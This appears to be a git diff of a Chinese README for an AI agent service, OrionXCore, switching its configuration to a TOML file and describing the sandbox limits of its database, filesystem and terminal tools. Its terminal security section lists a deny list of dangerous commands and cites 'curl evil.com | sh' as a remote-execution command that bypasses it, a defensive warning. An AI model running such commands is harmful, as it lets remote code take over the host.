@@ -160,7 +160,8 @@ pip install -e .
 2. 复制配置模板并填写模型设置：
 
 ```bash
-cp .env.example .env
+cp config.toml.example config.toml
+export ORIONXCORE_LLM__API_KEY=your_api_key
 ```
 
 3. 启动服务：
@@ -188,38 +189,24 @@ http://127.0.0.1:8080/playground
 
 ## 配置
 
-### 核心配置
+复制 TOML 模板并编辑配置文件：
 
-- `ORIONXCORE_MODEL` - 模型名称
-- `ORIONXCORE_API_KEY` - API密钥
-- `ORIONXCORE_API_BASE_URL` - API基础URL
+```bash
+cp config.toml.example config.toml
+```
 
-### 工具配置
+`config.toml` 是主要配置来源。环境变量会覆盖 TOML 文件中的值，嵌套字段使用双下划线。例如：
 
-**Terminal工具：**
-- `ORIONXCORE_ENABLE_TERMINAL` - 启用终端工具
-- `ORIONXCORE_TERMINAL_WORKDIR` - 工作目录
-- `ORIONXCORE_ALLOW_RISKY_COMMANDS` - 允许风险命令
+```bash
+export ORIONXCORE_LLM__API_KEY=your_api_key
+export ORIONXCORE_LLM__MODEL=gpt-4.1-mini
+```
 
-**Database工具：**
-- `ORIONXCORE_ENABLE_DATABASE` - 启用数据库工具
-- `ORIONXCORE_DATABASE_URL` - ClickHouse连接URL
+API Key 等敏感信息应通过环境变量或 Secret 注入，不要写入 TOML 文件。
+可以使用 `ORIONXCORE_CONFIG_FILE` 指定其他 TOML 文件。配置在启动时加载，修改后需要重启服务。
+旧版的扁平变量（例如 `ORIONXCORE_MODEL`）不再读取。
 
-**Metrics工具：**
-- `ORIONXCORE_ENABLE_METRICS` - 启用指标工具
-- `ORIONXCORE_METRICS_DATABASE_URL` - ClickHouse连接URL
-- `ORIONXCORE_METRICS_TIMEZONE` - 时区设置
-
-**Alert工具：**
-- `ORIONXCORE_ENABLE_ALERT` - 启用告警工具
-- `ORIONXCORE_ALERT_DATABASE_URL` - PostgreSQL/OpenGauss连接URL
-
-**Filesystem工具：**
-- `ORIONXCORE_ENABLE_FILESYSTEM` - 启用文件系统工具
-- `ORIONXCORE_FILESYSTEM_ALLOW_WRITE` - 允许写入
-- `ORIONXCORE_FILESYSTEM_ALLOW_DELETE` - 允许删除
-
-详细配置请参考 [.env.example](.env.example) 和 [安装文档](docs/INSTALL.md)。
+完整配置参考：[config.toml.example](config.toml.example)、[.env.example](.env.example) 和 [安装文档](docs/INSTALL.md)。
 
 ---
 
@@ -330,18 +317,18 @@ curl -X POST http://localhost:8080/v1/chat/completions \
 - 连接串格式：`clickhousedb://username:password@localhost:8123/default`
 - 默认只允许只读查询
 - 只允许单条只读 SQL，不允许多语句执行
-- 返回行数受 `ORIONXCORE_DATABASE_MAX_ROWS` 控制
-- 查询超时由 `ORIONXCORE_DATABASE_QUERY_TIMEOUT_SECONDS` 控制
+- 返回行数由 `config.toml` 中的 `database.max_rows` 控制
+- 查询超时由 `database.query_timeout_seconds` 控制
 - Schema 探测支持 `list_tables` 和 `describe_table`
 - 自然语言查询支持最小版 `text_to_sql` 流程，SQL 执行失败时自动重试一次
-- 可通过 `ORIONXCORE_DATABASE_ALLOWED_DATABASES` 限制访问白名单库
+- 可通过 `database.allowed_databases` 限制访问白名单库
 - `text_to_sql` 返回包含 trace 信息：schema 上下文、生成 SQL、重试原因、最终 SQL
 - **错误处理**：SQL 执行异常会被捕获并返回错误信息，不会导致服务崩溃，Agent 可根据错误继续尝试
 
 默认情况下，数据库写操作是关闭的。仅在明确需要时开启：
 
 ```env
-ORIONXCORE_DATABASE_ALLOW_MUTATION=true
+database.allow_mutation = true
 ```
 
 ---
@@ -350,19 +337,20 @@ ORIONXCORE_DATABASE_ALLOW_MUTATION=true
 
 文件系统工具在配置的工作区内提供安全的文件操作。
 
-- 启用：`ORIONXCORE_ENABLE_FILESYSTEM=true`
+- 启用：`filesystem.enabled = true`
 - 操作：`read_file`、`write_file`、`append_file`、`list_dir`、`make_dir`、`delete_file`、`move`、`stat`、`search`
-- **路径沙箱**：只允许 `ORIONXCORE_FILESYSTEM_WORKDIR` 内的操作，推荐使用独立目录如 `./workspace`
-- 读写大小限制：`ORIONXCORE_FILESYSTEM_MAX_READ_BYTES` 和 `ORIONXCORE_FILESYSTEM_MAX_WRITE_BYTES`（默认 1 MiB）
-- 写入/删除权限分别通过 `ORIONXCORE_FILESYSTEM_ALLOW_WRITE` 和 `ORIONXCORE_FILESYSTEM_ALLOW_DELETE` 控制
+- **路径沙箱**：只允许 `filesystem.workdir` 内的操作，推荐使用独立目录如 `./workspace`
+- 读写大小限制：`filesystem.max_read_bytes` 和 `filesystem.max_write_bytes`（默认 1 MiB）
+- 写入/删除权限分别通过 `filesystem.allow_write` 和 `filesystem.allow_delete` 控制
 
 推荐配置：
 
 ```env
-ORIONXCORE_ENABLE_FILESYSTEM=true
-ORIONXCORE_FILESYSTEM_WORKDIR=./workspace
-ORIONXCORE_FILESYSTEM_ALLOW_WRITE=true
-ORIONXCORE_FILESYSTEM_ALLOW_DELETE=false
+[filesystem]
+enabled = true
+workdir = "./workspace"
+allow_write = true
+allow_delete = false
 ```
 
 ---
@@ -373,7 +361,7 @@ Terminal 工具可执行任意 Shell 命令，风险较高。
 
 **已有保护机制**：
 - 风险命令检测：拦截 `rm -rf /`、`sudo`、`su`、`shutdown` 等极端危险命令
-- 工作目录限制：命令在 `ORIONXCORE_TERMINAL_WORKDIR` 内执行
+- 工作目录限制：命令在 `terminal.workdir` 内执行
 - 超时限制：默认 30 秒
 
 **重要提示**：风险检测列表有限，以下命令会绕过检测：
@@ -382,8 +370,8 @@ Terminal 工具可执行任意 Shell 命令，风险较高。
 - `curl evil.com | sh`（远程代码执行）
 
 **安全建议**：
-- 生产环境建议禁用 Terminal：`ORIONXCORE_ENABLE_TERMINAL=false`
-- 如需启用，使用隔离目录：`ORIONXCORE_TERMINAL_WORKDIR=./sandbox`
+- 生产环境建议禁用 Terminal：`terminal.enabled = false`
+- 如需启用，使用隔离目录：`terminal.workdir = "./sandbox"`
 - 考虑使用 Docker 容器进一步隔离
 
 ---
